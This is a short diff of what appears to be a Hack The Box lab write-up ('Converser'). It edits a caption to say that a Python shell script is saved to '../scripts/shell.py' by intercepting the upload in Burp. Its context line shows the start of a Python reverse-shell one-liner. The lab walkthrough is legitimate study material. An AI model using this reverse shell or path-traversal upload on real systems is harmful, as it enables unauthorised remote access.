@@ -195,7 +195,7 @@ import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec
 ![Desktop View](/assets/img/2025-10-28-HTB-Converser/shellpy.png)
 _Form view_
 
-and intercept the request in Burp to save that file in scripts directory
+and intercept the request in Burp to save that file in scripts directory (should be ../scripts/shell.py on the screenshot :))
 
 ![Desktop View](/assets/img/2025-10-28-HTB-Converser/shellpy-burp.png)
 _Burp intercepting and saving in another directory_
